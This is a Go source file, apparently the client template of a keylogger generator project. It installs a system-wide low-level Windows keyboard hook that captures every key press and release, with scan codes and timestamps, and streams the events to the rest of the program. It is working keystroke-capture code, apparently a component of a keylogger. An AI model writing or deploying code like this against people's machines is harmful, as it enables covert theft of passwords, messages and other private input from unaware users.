// GuiKeyStandaloneGo/generator/templates/client_template/keyboard_windows.go
package main

import (
	"fmt"
	"log"     // For logger parameter type
	"runtime" // For LockOSThread
	"sync"    // For WaitGroup
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// --- Windows API constants and structs for Keyboard Hook ---
const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_KEYUP       = 0x0101
	WM_SYSKEYDOWN  = 0x0104
	WM_SYSKEYUP    = 0x0105
	HC_ACTION      = 0
	LLKHF_UP       = 0x0080 // Key is being released
)

// Local definitions for Windows Virtual Key Codes
// Defined here for use by both keyboard_windows.go and keyboard_processing.go
const (
	VK_LBUTTON             = 0x01
	VK_RBUTTON             = 0x02
	VK_CANCEL              = 0x03
	VK_MBUTTON             = 0x04
	VK_XBUTTON1            = 0x05
	VK_XBUTTON2            = 0x06
	VK_BACK                = 0x08
	VK_TAB                 = 0x09
	VK_CLEAR               = 0x0C
	VK_RETURN              = 0x0D
	VK_SHIFT               = 0x10
	VK_CONTROL             = 0x11
	VK_MENU                = 0x12 // ALT key
	VK_PAUSE               = 0x13
	VK_CAPITAL             = 0x14 // CAPS LOCK
	VK_KANA                = 0x15
	VK_HANGUL              = 0x15
	VK_JUNJA               = 0x17
	VK_FINAL               = 0x18
	VK_HANJA               = 0x19
	VK_KANJI               = 0x19
	VK_ESCAPE              = 0x1B
	VK_CONVERT             = 0x1C
	VK_NONCONVERT          = 0x1D
	VK_ACCEPT              = 0x1E
	VK_MODECHANGE          = 0x1F
	VK_SPACE               = 0x20
	VK_PRIOR               = 0x21 // PAGE UP key
	VK_NEXT                = 0x22 // PAGE DOWN key
	VK_END                 = 0x23
	VK_HOME                = 0x24
	VK_LEFT                = 0x25
	VK_UP                  = 0x26
	VK_RIGHT               = 0x27
	VK_DOWN                = 0x28
	VK_SELECT              = 0x29
	VK_PRINT               = 0x2A
	VK_EXECUTE             = 0x2B
	VK_SNAPSHOT            = 0x2C // PRINT SCREEN key
	VK_INSERT              = 0x2D
	VK_DELETE              = 0x2E
	VK_HELP                = 0x2F
	VK_LWIN                = 0x5B
	VK_RWIN                = 0x5C
	VK_APPS                = 0x5D // Applications key
	VK_SLEEP               = 0x5F
	VK_NUMPAD0             = 0x60
	VK_NUMPAD1             = 0x61
	VK_NUMPAD2             = 0x62
	VK_NUMPAD3             = 0x63
	VK_NUMPAD4             = 0x64
	VK_NUMPAD5             = 0x65
	VK_NUMPAD6             = 0x66
	VK_NUMPAD7             = 0x67
	VK_NUMPAD8             = 0x68
	VK_NUMPAD9             = 0x69
	VK_MULTIPLY            = 0x6A
	VK_ADD                 = 0x6B
	VK_SEPARATOR           = 0x6C
	VK_SUBTRACT            = 0x6D
	VK_DECIMAL             = 0x6E
	VK_DIVIDE              = 0x6F
	VK_F1                  = 0x70
	VK_F2                  = 0x71
	VK_F3                  = 0x72
	VK_F4                  = 0x73
	VK_F5                  = 0x74
	VK_F6                  = 0x75
	VK_F7                  = 0x76
	VK_F8                  = 0x77
	VK_F9                  = 0x78
	VK_F10                 = 0x79
	VK_F11                 = 0x7A
	VK_F12                 = 0x7B
	VK_F13                 = 0x7C
	VK_F14                 = 0x7D
	VK_F15                 = 0x7E
	VK_F16                 = 0x7F
	VK_F17                 = 0x80
	VK_F18                 = 0x81
	VK_F19                 = 0x82
	VK_F20                 = 0x83
	VK_F21                 = 0x84
	VK_F22                 = 0x85
	VK_F23                 = 0x86
	VK_F24                 = 0x87
	VK_NUMLOCK             = 0x90
	VK_SCROLL              = 0x91 // SCROLL LOCK key
	VK_LSHIFT              = 0xA0
	VK_RSHIFT              = 0xA1
	VK_LCONTROL            = 0xA2
	VK_RCONTROL            = 0xA3
	VK_LMENU               = 0xA4 // Left ALT
	VK_RMENU               = 0xA5 // Right ALT
	VK_BROWSER_BACK        = 0xA6
	VK_BROWSER_FORWARD     = 0xA7
	VK_BROWSER_REFRESH     = 0xA8
	VK_BROWSER_STOP        = 0xA9
	VK_BROWSER_SEARCH      = 0xAA
	VK_BROWSER_FAVORITES   = 0xAB
	VK_BROWSER_HOME        = 0xAC
	VK_VOLUME_MUTE         = 0xAD
	VK_VOLUME_DOWN         = 0xAE
	VK_VOLUME_UP           = 0xAF
	VK_MEDIA_NEXT_TRACK    = 0xB0
	VK_MEDIA_PREV_TRACK    = 0xB1
	VK_MEDIA_STOP          = 0xB2
	VK_MEDIA_PLAY_PAUSE    = 0xB3
	VK_LAUNCH_MAIL         = 0xB4
	VK_LAUNCH_MEDIA_SELECT = 0xB5
	VK_LAUNCH_APP1         = 0xB6
	VK_LAUNCH_APP2         = 0xB7
	VK_OEM_1               = 0xBA // ';:' for US
	VK_OEM_PLUS            = 0xBB // '+' any country
	VK_OEM_COMMA           = 0xBC // ',' any country
	VK_OEM_MINUS           = 0xBD // '-' any country
	VK_OEM_PERIOD          = 0xBE // '.' any country
	VK_OEM_2               = 0xBF // '/?' for US
	VK_OEM_3               = 0xC0 // '`~' for US
	VK_OEM_4               = 0xDB // '[{' for US
	VK_OEM_5               = 0xDC // '\|' for US
	VK_OEM_6               = 0xDD // ']}' for US
	VK_OEM_7               = 0xDE // ''"' for US
	VK_OEM_8               = 0xDF
	VK_OEM_102             = 0xE2 // Either the angle bracket key or the backslash key on the RT 102-key keyboard
	VK_PROCESSKEY          = 0xE5
	VK_PACKET              = 0xE7
	VK_ATTN                = 0xF6
	VK_CRSEL               = 0xF7
	VK_EXSEL               = 0xF8
	VK_EREOF               = 0xF9
	VK_PLAY                = 0xFA
	VK_ZOOM                = 0xFB
	VK_NONAME              = 0xFC
	VK_PA1                 = 0xFD
	VK_OEM_CLEAR           = 0xFE
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// DLLs and Procedures - defined ONCE here for the package
var (
	lazyModUser32               = windows.NewLazySystemDLL("user32.dll")
	lazyModKernel32             = windows.NewLazySystemDLL("kernel32.dll") // Corrected name
	procSetWindowsHookExW       = lazyModUser32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx     = lazyModUser32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx          = lazyModUser32.NewProc("CallNextHookEx")
	procGetMessageW             = lazyModUser32.NewProc("GetMessageW")
	procTranslateMessage        = lazyModUser32.NewProc("TranslateMessage")
	procDispatchMessageW        = lazyModUser32.NewProc("DispatchMessageW")
	procGetModuleHandleW        = lazyModKernel32.NewProc("GetModuleHandleW")
	procGetKeyboardStateKeyProc = lazyModUser32.NewProc("GetKeyboardState") // For keyboard_processing.go
	procToUnicodeKeyProc        = lazyModUser32.NewProc("ToUnicode")        // For keyboard_processing.go
)

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type RawKeyData struct {
	VkCode    uint32
	ScanCode  uint32
	Flags     uint32
	IsKeyDown bool
	Timestamp time.Time
}

var (
	keyboardHookHandle uintptr // HHOOK
	keyDataChanGlobal  chan<- RawKeyData
)

func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == HC_ACTION {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		isDown := !(wParam == WM_KEYUP || wParam == WM_SYSKEYUP || (kbdStruct.Flags&LLKHF_UP != 0))

		if keyDataChanGlobal != nil {
			select {
			case keyDataChanGlobal <- RawKeyData{
				VkCode:    kbdStruct.VkCode,
				ScanCode:  kbdStruct.ScanCode,
				Flags:     kbdStruct.Flags,
				IsKeyDown: isDown,
				Timestamp: time.Now().UTC(),
			}:
			default:
				// Dropping key event: channel full or closed.
			}
		}
	}
	nextHook, _, _ := syscall.SyscallN(procCallNextHookEx.Addr(), keyboardHookHandle, uintptr(nCode), wParam, lParam)
	return nextHook
}

func runKeyboardHookMessageLoop(keyDataChan chan<- RawKeyData, hookQuitChan <-chan struct{}, logger *log.Logger) {
	keyDataChanGlobal = keyDataChan

	hModule, _, errGetModuleHandle := syscall.SyscallN(procGetModuleHandleW.Addr(), 0)
	if hModule == 0 {
		errMsg := "KBHOOK: GetModuleHandleW(NULL) failed"
		if errGetModuleHandle != 0 {
			errMsg = fmt.Sprintf("%s: %s", errMsg, errGetModuleHandle.Error())
		}
		if logger != nil {
			logger.Println(errMsg)
		} else {
			log.Println(errMsg)
		}
		return
	}

	keyboardProcCallbackFn := syscall.NewCallback(lowLevelKeyboardProc)

	hHook, _, errSetHook := syscall.SyscallN(procSetWindowsHookExW.Addr(),
		uintptr(WH_KEYBOARD_LL),
		keyboardProcCallbackFn,
		hModule,
		0)

	if hHook == 0 {
		errMsg := "KBHOOK: SetWindowsHookExW failed"
		if errSetHook != 0 {
			errMsg = fmt.Sprintf("%s: %s", errMsg, errSetHook.Error())
		}
		if logger != nil {
			logger.Println(errMsg)
		} else {
			log.Println(errMsg)
		}
		return
	}
	keyboardHookHandle = hHook
	if logger != nil {
		logger.Println("KBHOOK: Keyboard hook set successfully.")
	}

	defer func() {
		if keyboardHookHandle != 0 {
			r1, _, errUnhook := syscall.SyscallN(procUnhookWindowsHookEx.Addr(), keyboardHookHandle)
			if r1 == 0 {
				errMsg := "KBHOOK: UnhookWindowsHookEx failed"
				if errUnhook != 0 {
					errMsg = fmt.Sprintf("%s: %s", errMsg, errUnhook.Error())
				}
				if logger != nil {
					logger.Println(errMsg)
				}
			} else {
				if logger != nil {
					logger.Println("KBHOOK: Keyboard hook successfully unhooked.")
				}
			}
			keyboardHookHandle = 0
		}
		keyDataChanGlobal = nil
	}()

	var msg MSG
	for {
		select {
		case <-hookQuitChan:
			if logger != nil {
				logger.Println("KBHOOK: Message loop received quit signal (pre-GetMessage).")
			}
			return
		default:
		}

		ret, _, errGetMsg := syscall.SyscallN(procGetMessageW.Addr(), uintptr(unsafe.Pointer(&msg)), 0, 0, 0)

		select {
		case <-hookQuitChan:
			if logger != nil {
				logger.Println("KBHOOK: Message loop received quit signal (post-GetMessage).")
			}
			return
		default:
		}

		if int(ret) == -1 {
			errMsg := "KBHOOK: GetMessageW error"
			if errGetMsg != 0 {
				errMsg = fmt.Sprintf("%s: %s", errMsg, errGetMsg.Error())
			}
			if logger != nil {
				logger.Println(errMsg)
			}
			return
		}
		if int(ret) == 0 { // WM_QUIT
			if logger != nil {
				logger.Println("KBHOOK: GetMessageW received WM_QUIT.")
			}
			return
		}

		syscall.SyscallN(procTranslateMessage.Addr(), uintptr(unsafe.Pointer(&msg)))
		syscall.SyscallN(procDispatchMessageW.Addr(), uintptr(unsafe.Pointer(&msg)))
	}
}

func startKeyboardMonitor(keyDataChan chan<- RawKeyData, internalQuitChan <-chan struct{}, wg *sync.WaitGroup, logger *log.Logger) {
	if logger != nil {
		logger.Println("KBHOOK: Initializing keyboard monitor...")
	}

	hookThreadQuitChan := make(chan struct{})

	wg.Add(1)
	go func() {
		defer wg.Done()
		monitorLoopDone := make(chan struct{})

		go func() {
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			defer close(monitorLoopDone)

			if logger != nil {
				logger.Println("KBHOOK: OS-locked thread for hook message loop starting.")
			}
			runKeyboardHookMessageLoop(keyDataChan, hookThreadQuitChan, logger)
			if logger != nil {
				logger.Println("KBHOOK: OS-locked thread (runKeyboardHookMessageLoop) finished.")
			}
		}()

		select {
		case <-internalQuitChan:
			if logger != nil {
				logger.Println("KBHOOK: Managing goroutine received internal quit signal, signaling hook thread to stop.")
			}
			close(hookThreadQuitChan)
			<-monitorLoopDone
		case <-monitorLoopDone:
			if logger != nil {
				logger.Println("KBHOOK: OS-locked hook message loop exited independently.")
			}
		}

		if logger != nil {
			logger.Println("KBHOOK: Keyboard monitor managing goroutine finished.")
		}
	}()
}
